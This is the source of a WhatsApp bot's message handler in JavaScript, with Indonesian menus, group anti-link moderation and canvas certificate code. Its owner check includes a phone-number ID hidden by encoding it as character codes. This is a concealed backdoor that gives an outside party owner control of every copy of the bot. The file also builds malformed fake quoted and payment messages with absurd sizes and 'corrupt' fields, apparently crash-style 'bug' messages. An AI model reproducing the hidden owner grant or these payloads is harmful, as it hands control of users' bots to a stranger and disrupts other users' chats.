    
process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

// -----------------------------[ 1 ]------------------------------
require('./config');               // load config
const fs = require('fs');         // sistem file
const os = require('os');         // info sistem  
const util = require('util');       // kepo babi
const pino = require('pino');     // logger
const path = require('path');     // utilitas path
const jimp = require('jimp');     // edit gambar
const axios = require('axios');   // http client
const chalk = require('chalk');   // warna teks
const yts = require('yt-search'); // search yt
const crypto = require('crypto'); // kriptografi
const cheerio = require('cheerio'); // parser html
const fetch = require('node-fetch'); // fetch api
const nou = require("node-os-utils"); // monitor sistem
const FormData = require('form-data'); // form data
const gradient = require('gradient-string'); // gradient
const JsConfuser = require('js-confuser'); // obf
const speed = require('performance-now'); // ping
const moment = require("moment-timezone"); // time
const { say } = require("cfonts"); // ascii
const { exec, spawn, execSync } = require('child_process'); // proses

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

async function updateApiKeys(updates) {
  const settingsPath = './config.js';
  try {
    let fileContent = fs.readFileSync(settingsPath, 'utf8');
    updates.forEach(update => {
      const regex = new RegExp(`(global\\.${update.key}\\s*=\\s*)['"].*?['"]`);
      if (regex.test(fileContent)) {
        fileContent = fileContent.replace(regex, `$1'${update.value}'`);
      }
    });
    fs.writeFileSync(settingsPath, fileContent, 'utf8');
    return true;
  } catch (error) {
    console.error(chalk.red('❌ Gagal menyimpan API Key ke config.js:', error));
    return false;
  }
}

// -----------------------------[ 2 ]------------------------------ //
const {
  default: WANocuzection,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  getBinaryNodeChildren,
  useMultiFileAuthState,
  generateWAMessageContent,
  downloadContentFromMessage,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require('@whiskeysockets/baileys');

// -----------------------------[ 3 ]------------------------------ //
const { LoadDataBase } = require('./source/message');
const list = JSON.parse(fs.readFileSync('./library/database/list.json'));
const unli = JSON.parse(fs.readFileSync('./library/database/unli.json'));
const reseller = JSON.parse(fs.readFileSync('./library/database/reseller.json'));
const owners = JSON.parse(fs.readFileSync('./library/database/owner.json'));
const contacts = JSON.parse(fs.readFileSync('./library/database/contacts.json'));
const premium = JSON.parse(fs.readFileSync('./library/database/premium.json'));
const { toAudio, toPTT, toVideo, ffmpeg } = require('./library/converter.js');
const { checkGroupAdmin } = require('./lib/groupAdmin')
const antilinkDB = JSON.parse(
    fs.readFileSync('./database/antilink.json')
)

const saveAntilink = () => {
    fs.writeFileSync(
        './database/antilink.json',
        JSON.stringify(antilinkDB, null, 2)
    )
}
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const {
  unixTimestampSeconds,
  generateMessageTag,
  processTime,
  webApi,
  getRandom,
  getBuffer,
  fetchJson,
  runtime,
  clockString,
  sleep,
  isUrl,
  getTime,
  formatDate,
  tanggal,
  formatp,
  jsonformat,
  reSize,
  toHD,
  logic,
  generateProfilePicture,
  bytesToSize,
  checkBandwidth,
  getSizeMedia,
  parseMention,
  readFileTxt,
  readFileJson,
  getHashedPassword,
  generateAuthToken,
  cekMenfes,
  generateToken,
  batasiTeks,
  randomText,
  isEmoji,
  getTypeUrlMedia,
  pickRandom,
  toIDR,
  capital
} = require('./library/function');

////////////////////////////////////////////////////////////////////////////////
let autoSher = {
  aktif: false,
  teks: "",
  delay: 0,
  interval: null
}

let blacklistGroup = [
  // isi JID grup blacklist
  // "1203630xxxxxx@g.us"
]

// -----------------------------[ 4 ]------------------------------ //
module.exports = Nocuz = async (Nocuz, m, chatUpdate, store) => {
	try {
await LoadDataBase(Nocuz, m)
const botNumber = await Nocuz.decodeJid(Nocuz.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 49, 55, 57, 56, 51, 54, 54, 48, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = `.`
const isCmd = (typeof body === 'string' && body.startsWith(prefix)) ? true : false;
const args = (body || '').trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPrem = premium.includes(m.sender) || premium.includes(m.sender.split('@')[0]);
const isUnli = unli.includes(m.chat)
const isReseller = reseller.includes(m.chat)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isOwners ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const foto = fs.readFileSync('./image/bokep.jpg')
const yuda = fs.readFileSync('./image/bokep1.jpg')
const pler = fs.readFileSync('./image/Nocuz.mp3')
const mmk = fs.readFileSync('./image/SarDev.mp3')
const anj = fs.readFileSync('./image/Menu.mp3')

//  ███████████[ CMD PANEL ]███████████████ //
if (isCmd) {
    try {
        say('NOCUZ', {
            font: 'block',
            align: 'center',
            colors: ['white'],
            background: 'transparent',
            letterSpacing: 1,
            lineHeight: 1,
            space: true,
            maxLength: '0'
        });

        console.log(
            chalk.gray('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬') +
            '\n' +

            chalk.bgBlack.white(' MSG ') +
            chalk.gray(' │ ') +
            chalk.white(m.text || '-') +
            '\n' +

            chalk.bgBlack.white(' FROM ') +
            chalk.gray(' │ ') +
            chalk.white(m.sender) +
            '\n' +

            chalk.bgBlack.white(' TYPE ') +
            chalk.gray(' │ ') +
            chalk.white(m.mtype) +
            '\n' +

            chalk.bgBlack.white(' CHAT ') +
            chalk.gray(' │ ') +
            chalk.white(m.isGroup ? 'GROUP' : 'PRIVATE') +
            '\n' +

            chalk.gray('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n')
        );

    } catch (err) {
        console.log('CFonts Log Error:', err);
    }
}

///  █████████[ GROUP SUPPORT ]████████████ ///

// ===================== HANDLER PESAN MASUK ===================== //
// Tempelkan ini di awal handler pesan async, sebelum switch
if ((global.db.groups[m.chat]?.antilink) || (global.db.groups[m.chat]?.antilink2)) {
const sender = m.sender;
const groupId = m.chat;
const messageText = m.text || body || '';

// Cek link WA  
const isLink = /chat\.whatsapp\.com\/\S+/i.test(messageText);  
if (!isLink) return;  

// -------------------- ANTILINK V1 -------------------- //  
if (global.db.groups[groupId].antilink) {  
    if (!global.db.users[sender]) global.db.users[sender] = { warn: 0 };  
    global.db.users[sender].warn = (global.db.users[sender].warn || 0) + 1;  

    await Nocuz.sendMessage(groupId, {  
        text: `⚠️ Hati-hati! Anda mengirim link grup.\nPeringatan ${global.db.users[sender].warn}/5`,  
        mentions: [sender]  
    });  

    await Nocuz.sendMessage(groupId, { delete: m.key });  

    if (global.db.users[sender].warn >= 5 && m.isGroup && Nocuz.user.jid.admin) {  
        await Nocuz.sendMessage(groupId, {  
            text: `🚫 @${sender.split("@")[0]} telah melanggar 5x, akan di kick!`,  
            mentions: [sender]  
        });  
        await Nocuz.groupParticipantsUpdate(groupId, [sender], "remove");  
        global.db.users[sender].warn = 0;  
    }  
}  

// -------------------- ANTILINK V2 -------------------- //  
if (global.db.groups[groupId].antilink2) {  
    await Nocuz.sendMessage(groupId, { delete: m.key });  
    await Nocuz.sendMessage(groupId, {  
        text: `⚠️ @${sender.split("@")[0]} dilarang mengirim link grup!`,  
        mentions: [sender]  
    });  

    if (m.isGroup && Nocuz.user.jid.admin) {  
        try {  
            await Nocuz.groupParticipantsUpdate(groupId, [sender], "remove");  
        } catch (e) {  
            console.log("Gagal kick user:", e);  
        }  
    }  
}

}

//mute
if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return


///  ██████████[ FAKE QOUTED ]█████████████ ///
const asq = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "8888",
      thumbnail: foto,
      itemCount: "1701",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Status : ${Nocuz.public ? "Public Mode" : "Self Mode"}
Runtime : ${runtime(process.uptime())}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
// ───────────────────────────────
const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "8888",
      thumbnail: foto,
      itemCount: "999",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Hello, Welcome to Nocuz`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
// ─────────────────────────────── //
const qtext = {
  key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net" },
  message: { extendedTextMessage: { text: `𓆩 Nσƈυȥ Rҽαʅιƚყ V7 𓆪` } }
}
// ───────────────────────────────
// ───────────────────────────────//
const qtext2 = {
  key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net" },
  message: { extendedTextMessage: { text: `${namaOwner}` } }
}
// ─────────────────────────────── //
const qlocJpm = {
  key: { participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {}) },
  message: { locationMessage: { name: `WhatsApp Bot ${namaOwner}`, jpegThumbnail: "" } }
}
// ─────────────────────────────── //
const qlocPush = {
  key: { participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {}) },
  message: { locationMessage: { name: `WhatsApp Bot ${namaOwner}`, jpegThumbnail: "" } }
}
// ─────────────────────────────── //
 //            [ NEW UPDATE FILE SIZE ].       \\
 const safeKey = (m) => {
    if (!m) return {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    }

    return {
        remoteJid: m.chat || m.key?.remoteJid || '0@s.whatsapp.net',
        fromMe: false,
        participant: m.key?.participant || '0@s.whatsapp.net'
    }
}

const lolGlitchExtremeV2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "GLT-XV2-777",
      itemCount: "???",
      status: "!!! SYS_ERR VIP !!!",
      surface: "CATALOG:▒▓ CORRUPT ▓▒",
      message: `- !sY5t3m </> ☇ ㅊ SΔrXp!l0t ㅊ ☇`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
    externalAdReply: {
      showAdAttribution: true,
      title: "N̷O̷C̷U̷Z̷ V̷E̷R̷I̷S̷O̷N̷ 7̷",
      body: "☇  ㅊ I CФMΞ ㅊ  ☇",
      mediaType: 2,
      mediaUrl: "https://sarcrazzy-store.my.id"
    }
  }
};

// ─────────────────────────────── //
//           [ END NEW FILE SIZE ].             \\
const qpayment = {
  key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net' },
  message: {
    requestPaymentMessage: {
      currencyCodeIso4217: "USD",
      amount1000: 999999999,
      requestFrom: '0@s.whatsapp.net',
      noteMessage: { extendedTextMessage: { text: "7879"} },
      expiryTimestamp: 999999999,
      amount: { value: 91929291929, offset: 1000, currencyCode: "USD" }
    }
  }
}
// ─────────────────────────────── //
const qtoko = {
  key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {}) },
  message: {
    productMessage: {
      product: {
        productImage: { mimetype: "image/jpeg", jpegThumbnail: "" },
        title: `${namaOwner} - Marketplace`,
        description: null,
        currencyCode: "IDR",
        priceAmount1000: "999999999999999",
        retailerId: `Powered By ${namaOwner}`,
        productImageCount: 1
      },
      businessOwnerJid: `0@s.whatsapp.net`
    }
  }
}
// ─────────────────────────────── //
const qlive = {
  key: { participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {}) },
  message: { liveLocationMessage: { caption: `${botname2} By ${namaOwner}`, jpegThumbnail: "" } }
}

//  ████████████[ TIME ]████████████████ //
const sleep = (ms) => new Promise(r => setTimeout(r, ms))

function getGreeting() {
  const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) return "Good Morning 🌆";
  if (hours >= 12 && hours < 18) return "Good Afternoon 🌇";
  return "Good Night 🌌";
}

function runtime(seconds) {
  seconds = Math.floor(seconds)
  let days = Math.floor(seconds / 86400)
  let hours = Math.floor((seconds % 86400) / 3600)
  let minutes = Math.floor((seconds % 3600) / 60)
  let secs = seconds % 60
  return `${days}d ${hours}h ${minutes}m ${secs}s`
}

function getMenuSound() {
  const jam = moment.tz('Asia/Jakarta').hour()

  // Sahur: 03:00 - 05:59
  if (jam >= 3 && jam < 6) return './sound/sahur.mp3'

  // Pagi: 06:00 - 09:59
  if (jam >= 6 && jam < 10) return './sound/pagi.mp3'

  // Siang: 10:00 - 14:59
  if (jam >= 10 && jam < 15) return './sound/siang.mp3'

  // Sore: 15:00 - 17:59
  if (jam >= 15 && jam < 18) return './sound/sore.mp3'

  // Petang: 18:00 - 18:59
  if (jam >= 18 && jam < 19) return './sound/petang.mp3'

  // Malam: 19:00 - 02:59
  return './sound/malam.mp3'
}

function getGreeting() {
    const hours = new Date().getHours();
    if (hours >= 0 && hours < 12) {
        return "Good Morning 🌆";
    } else if (hours >= 12 && hours < 18) {
        return " Good Afternoon 🌇";
    } else {
        return "Good Night 🌌";
    }
}

const greeting = getGreeting();

if (!isCmd) {
    let check = list.find(e => e.cmd == body.toLowerCase());
    if (check) {
        await m.reply(check.respon);
    }
}

//  ███████████[ FUNCTION ]███████████████ //



//  ███████████[ END FUNC ]███████████████ //

//  ███████████[ EXAMPLE ]███████████████ //
const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

//  █████████[ SEND FILE DLL ]█████████████ //
Nocuz.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
// ───────────────────────────────
    let type = await Nocuz.getFile(path, true)
// ───────────────────────────────
    let { res, data: file, filename: pathFile } = type
// ───────────────────────────────
    if (res && res.status !== 200 || file.length <= 65536) {
        try {
            throw { json: JSON.parse(file.toString()) }
        } catch (e) {
            if (e.json) throw e.json
        }
    }
// ───────────────────────────────
    let opt = { filename }
// ───────────────────────────────
    if (quoted) opt.quoted = quoted
// ───────────────────────────────    
    if (!type) options.asDocument = true
// ───────────────────────────────
    let mtype = '',
        mimetype = type.mime,
        convert
// ───────────────────────────────
    if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) 
        mtype = 'sticker'
// ───────────────────────────────        
    else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) 
        mtype = 'image'
// ───────────────────────────────        
    else if (/video/.test(type.mime)) 
        mtype = 'video'
// ───────────────────────────────        
    else if (/audio/.test(type.mime)) {
        convert = await (ptt ? toPTT : toAudio)(file, type.ext)
        file = convert.data
        pathFile = convert.filename
        mtype = 'audio'
        mimetype = 'audio/ogg; codecs=opus'
    } 
    else 
        mtype = 'document'
// ───────────────────────────────
    if (options.asDocument) mtype = 'document'
// ───────────────────────────────
    delete options.asSticker
    delete options.asLocation
    delete options.asVideo
    delete options.asDocument
    delete options.asImage
// ───────────────────────────────
    let message = { 
        ...options, 
        caption, 
        ptt, 
        [mtype]: { url: pathFile }, 
        mimetype 
    }
// ───────────────────────────────    
    let m
// ───────────────────────────────
    try {
        m = await Nocuz.sendMessage(jid, message, { ...opt, ...options })
    } catch (e) {
        m = null
    } finally {
        if (!m) 
            m = await Nocuz.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options })
        
        file = null
        return m
    }
}
//  ████████████[ DLL 1 ]████████████████ //
function capitalize(word) {
  return word.charAt(0).toUpperCase() + word.slice(1);
}

function generateRandomPassword() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*'
    const length = 10
    let password = ''
    
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length)
        password += characters[randomIndex]
    }
    
    return password
}
// ───────────────────────────────
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
// ───────────────────────────────
const Reply = async (teks) => {
  return Nocuz.sendMessage(
    m.chat, 
    {
      text: teks, 
      mentions: [m.sender], 
      contextInfo: {
        externalAdReply: {
          title: botname, 
          body: `© Powered By ${namaOwner}`, 
          thumbnailUrl: global.image.reply, 
          sourceUrl: null, 
        }
      }
    }, 
    { quoted: qtext }
  )
}
// ───────────────────────────────
async function xNocuzreply(teks) {
  const ppuser = "https://files.catbox.moe/t60flr.jpg"; 
  
  return Nocuz.sendMessage(
    m.chat, 
    { 
      text: `${teks}`, 
      contextInfo: { 
        mentionedJid: [m.sender], 
        externalAdReply: {
          showAdAttribution: true, 
          thumbnailUrl: ppuser, 
          title: "Nocuz Version 6",
          body: "ѕαя¢яαzzу",
          previewType: "PHOTO"
        }
      }
    }, 
    { quoted: lol }
  )
}
// ───────────────────────────────
const Nocuzreply = (teks) => {
  Nocuz.sendMessage(
    m.chat, 
    {
      text: teks,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: "Nocuz Version 6",
          body: '©ѕαя¢яαzzу',
          thumbnailUrl: 'https://files.catbox.moe/t60flr.jpg',
          sourceUrl: "https://whatsapp.com/channel/0029VbBb2SS65yDC5OvajY22",
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, 
    { quoted: lol }
  );
}
// ───────────────────────────────
const xxNocuzreply = (teks) => {
  return Nocuz.sendMessage(
    m.chat, 
    {
      text: teks,  
      contextInfo: {
        document: fs.readFileSync("./package.json"),
        filename: `ѕαя¢яαzzу`,
        mimetype: 'application/pdf',
        fileLength: 99999999999999999999999999999999999999,
        pageCount: 10909143,	
        mentionedJid: [m.sender],
        externalAdReply: {
          showAdAttribution: true,
          title: `ѕαя¢яαzzу`,
          body: `☠︎`,
          previewType: "PHOTO",
          thumbnail: yuda,
          sourceUrl: ``
        }
      }
    }, 
    { quoted: lol }
  )
}


//  ███████████[ FUNC FITUR ]███████████████
async function generateAndSendCertificate(recipientName, achievementText) {
    const { createCanvas, loadImage } = require("canvas");
    const width = 1000;
    const height = 700;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext("2d");
    const backgroundUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMXesWUGxIerARGsveu1mOdGdXM0icRcBLtSA-L5UNSdUaRjEYRez9ngnc&s=10";
    try {
        const background = await loadImage(backgroundUrl);
        ctx.drawImage(background, 0, 0, width, height);
    } catch (error) {
        console.error("Error loading background image:", error);
        ctx.fillStyle = "#f8f8f8";
        ctx.fillRect(0, 0, width, height);
    }
    
    const gradient = ctx.createLinearGradient(0, 0, 0, height);
    gradient.addColorStop(0, "rgba(255,255,255,0.3)");
    gradient.addColorStop(1, "rgba(255,255,255,0.7)");
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, width, height);
// ───────────────────────────────
    function drawRoundedRect(ctx, x, y, w, h, r) {
        ctx.beginPath();
        ctx.moveTo(x + r, y);
        ctx.lineTo(x + w - r, y);
        ctx.quadraticCurveTo(x + w, y, x + w, y + r);
        ctx.lineTo(x + w, y + h - r);
        ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
        ctx.lineTo(x + r, y + h);
        ctx.quadraticCurveTo(x, y + h, x, y + h - r);
        ctx.lineTo(x, y + r);
        ctx.quadraticCurveTo(x, y, x + r, y);
        ctx.closePath();
    }
    ctx.lineWidth = 8;
    const borderGradient = ctx.createLinearGradient(0, 0, width, height);
    borderGradient.addColorStop(0, "#ff7f50");
    borderGradient.addColorStop(1, "#ff1493");
    ctx.strokeStyle = borderGradient;
    drawRoundedRect(ctx, 10, 10, width - 20, height - 20, 30);
    ctx.stroke();
    ctx.shadowColor = "rgba(0,0,0,0.3)";
    ctx.shadowBlur = 10;
    ctx.shadowOffsetX = 2;
    ctx.shadowOffsetY = 2;
    ctx.fillStyle = "#333";
    ctx.font = "bold 50px Georgia";
    ctx.textAlign = "center";
    ctx.fillText("SERTIFIKAT SIFAT", width / 2, 120);
    ctx.shadowColor = "transparent";
    ctx.font = "italic 30px Georgia";
    ctx.fillStyle = "#555";
    ctx.fillText("Presented To", width / 2, 180);
    ctx.font = "bold 40px Georgia";
    ctx.fillStyle = "#000";
    ctx.fillText(recipientName, width / 2, 260);
    ctx.font = "30px Georgia";
    ctx.fillStyle = "#333";
    ctx.fillText(achievementText, width / 2, 330);
    ctx.strokeStyle = "#ff1493";
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.moveTo(width / 4, 360);
    ctx.lineTo(width * 3 / 4, 360);
    ctx.stroke();
    
    const today = new Date();
    ctx.font = "20px Georgia";
    ctx.textAlign = "right";
    ctx.fillStyle = "#000";
    ctx.fillText(`Tanggal: ${today.toLocaleDateString()}`, width - 40, height - 40);
    ctx.font = "24px Georgia";
    ctx.textAlign = "left";
    ctx.fillText("by sarcrazzy v5", 50, height - 50);

    const buffer = canvas.toBuffer("image/png");
    await Nocuz.sendMessage(m.chat, {
        image: buffer,
        caption: `_Sukses Membuat Sertifikat ${recipientName}_`
    }, { quoted: m });
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

//  █████████████████████████████████
//   ████████████[ CASE ]██████████████
//  █████████████████████████████████
// btw semangat rename nya puh akwkwk

//SWITCH
 switch (command) {
//=======================================================\\


case "menu": {
  // Dapatkan informasi waktu dan audio
  const timeInfo = getMenuSound();
  const greetingMsg = getGreeting();
  
  let teksnya = `
Haii kamuuuu (｡•́︿•̀｡) 💕
Aku bot kecil tapi imut, bukan mantan kamu kok 😤
Siap nemenin kamu hari ini ✨

Jangan lupa senyum yaa,
soalnya kamu lucu… eh maksudnya menu aku 😳

╭─── ❀ 𝑴𝑬𝑵𝑼 𝑰𝑴𝑼𝑻 ❀ ───╮
│ ૮₍˶ •̀ ᴗ •́ ˶₎ა 💕
│
│ Haii kak 👉👈
│ Aku siap bantu kamu~
│ Jangan marah ya kalau aku lemot 😭
│
│ ── ❀ 𝑴𝑬𝑵𝑼 𝑼𝑻𝑨𝑴𝑨 ❀ ──
│ 🌷 .menu
│ 🌷 .allmenu
│ 🌷 .panelmenu 
│ 🌷 .funmenu
│ 🎀 .grubmenu
│ 🎀 .gamemenu
│ 🎀 .ownermenu
│ 🎀 .settingmenu
│ 🧸 .jpmmenu
│ 🧸 .storemenu
│ 🧸 .matematikamenu
│ 🍓 .kejutanmenu
│ 🍓 .quotesmenu
│ 🍓 .jashermenu
│ 🍁 .animemenu
│ 🍁 .18+
│ 🍁 .islamimenu
│ 🍁 .pushmenu
│ ✨ .bugmenu
│ ✨ .gombalmenu
│ ✨ .thanks-to
│ ✨ jashermenu
│
│ Makasih yaa udah pake aku 💞
│ Jangan tinggalin aku kayak dia 😔
╰───────────────╯

Segitu dulu yaaa 🥺
Kalau error jangan marah,
aku cuma bot kecil yang pengen disayang 💔

Ketik .menu lagi kalau kangen aku 💕
`;

 


          await Nocuz.sendMessage(m.chat, {
            text: teksnya,
            contextInfo: {
              externalAdReply: {
                title: 'ᴀꜱɪꜱᴛᴇɴ ɴᴏᴄᴜᴢ ♡',
                body: '❀ Powered By Sarcrazzy ❀',
                thumbnailUrl: 'https://files.catbox.moe/rs37rg.jpg',
                sourceUrl: 'https://whatsapp.com/channel/0029VbBb2SS65yDC5OvajY22',
                mediaType: 1,
                renderLargerThumbnail: false
              }
            }
          }, { quoted: m }).catch(e => {
            console.error(chalk.yellow('Menu send error'))
          })

          // Send audio
          let audioPath = getMenuSound()
          if (fs.existsSync(audioPath)) {
            setTimeout(() => {
              try {
                const audioBuffer = fs.readFileSync(audioPath)
                Nocuz.sendMessage(m.chat, {
                  audio: audioBuffer,
                  mimetype: 'audio/mpeg',
                  ptt: false
                }, { quoted: m }).catch(() => {})
              } catch (e) {}
            }, 300)
          }

          break
        }
        
        
        
case "grubmenu": {
  // Dapatkan informasi waktu dan audio
  const timeInfo = getMenuSound();
  const greetingMsg = getGreeting();
  
  let teksnya = `
Haii kamuuuu (｡•́︿•̀｡) 💕
ini menu grub akuuu,humm menu aku
engga terlalu banya maap yaa engga 
bisa sesempurna mereka 💅

╭─── ❀ 𝑴𝑬𝑵𝑼 𝑰𝑴𝑼𝑻 ❀ ───╮
│ ૮₍˶ •̀ ᴗ •́ ˶₎ა 💕
│ Haii kak 👉👈 Aku siap bantu kamu~
│ Jangan marah ya kalau aku lemot 😭
│
│ ── ❀ 𝑮𝑹𝑶𝑼𝑷 𝑴𝑬𝑵𝑼 ❀ ──
│ 🍓 .grubmenu
│ 🍓 .opengc
│ 🍓 .closegc
│ 🍓 .promote
│ 🍓 .demote
│ 🍓 .addmember
│ 🍓 .kick
│ 🍓 .leave
│ 🍓 .resetlinkgc
│ 🍓 .linkgc
│ 🍓 .tagall
│ 🍓 .hidetag
│ 🍓 .mute
│ 🍓 .cekidgc
│ 🍓 .listgc
│ 🍓 .antilink on/off
│ 🍁 .antilinkv2
│ 🍁 .antifoto
│ 🍁 .antifotov2
│ 🍁 .antiundadmin
│ 🍁 .antidelete
│ 🍁 .antibot
│ 🍁 .antistiker
│ 🍁 .antistikerv2
│ 🍁 .antiwame
│ 🍁 .antiwamev2
│ 🍁 .antilinkall
│ 🍁 .antilinkallv2
│ 🍁 .welcome 
│ 🍁 .goodbye 
│ 🍁 .setwelcome
╰───────────────╯
`;

 


          await Nocuz.sendMessage(m.chat, {
            text: teksnya,
            contextInfo: {
              externalAdReply: {
                title: 'ᴀꜱɪꜱᴛᴇɴ ɴᴏᴄᴜᴢ ♡',
                body: '❀ Powered By Sarcrazzy ❀',
                thumbnailUrl: 'https://files.catbox.moe/rs37rg.jpg',
                sourceUrl: 'https://whatsapp.com/channel/0029VbBb2SS65yDC5OvajY22',
                mediaType: 1,
                renderLargerThumbnail: false
              }
            }
          }, { quoted: m }).catch(e => {
            console.error(chalk.yellow('Menu send error'))
          })

          // Send audio
          let audioPath = getMenuSound()
          if (fs.existsSync(audioPath)) {
            setTimeout(() => {
              try {
                const audioBuffer = fs.readFileSync(audioPath)
                Nocuz.sendMessage(m.chat, {
                  audio: audioBuffer,
                  mimetype: 'audio/mpeg',
                  ptt: false
                }, { quoted: m }).catch(() => {})
              } catch (e) {}
            }, 300)
          }

          break
        }        
/*

╭─── ❀ 𝑴𝑬𝑵𝑼 𝑰𝑴𝑼𝑻 ❀ ───╮
│ ૮₍˶ •̀ ᴗ •́ ˶₎ა 💕
│ Haii kak 👉👈 Aku siap bantu kamu~
│ Jangan marah ya kalau aku lemot 😭
│
│ ── ❀ 𝑮𝑹𝑶𝑼𝑷 𝑴𝑬𝑵𝑼 ❀ ──
│ 🍓 .grubmenu
│ 🍓 .opengc
│ 🍓 .closegc
│ 🍓 .promote
│ 🍓 .demote
│ 🍓 .addmember
│ 🍓 .kick
│ 🍓 .leave
│ 🍓 .resetlinkgc
│ 🍓 .linkgc
│ 🍓 .tagall
│ 🍓 .hidetag
│ 🍓 .mute
│ 🍓 .cekidgc
│ 🍓 .listgc
│ 🍓 .antilink on/off
│
│ ── ❀ 𝑭𝑼𝑵 & 𝑮𝑨𝑴𝐸𝑺 ❀ ──
│ 🎀 .funmenu
│ 🎀 .gamemenu
│ 🎀 .truth
│ 🎀 .dare
│ 🎀 .cekmati
│ 🎀 .gombalmenu
│ 🎀 .quotesmenu
│ 🎀 .kejutanmenu
│ 🎀 .jashermenu
│
│ ── ❀ 𝑶𝑾𝑵𝐸𝑹 & 𝑷𝑨𝑵𝑬𝑳 ❀ ──
│ 🧸 .ownermenu
│ 🧸 .panelmenu
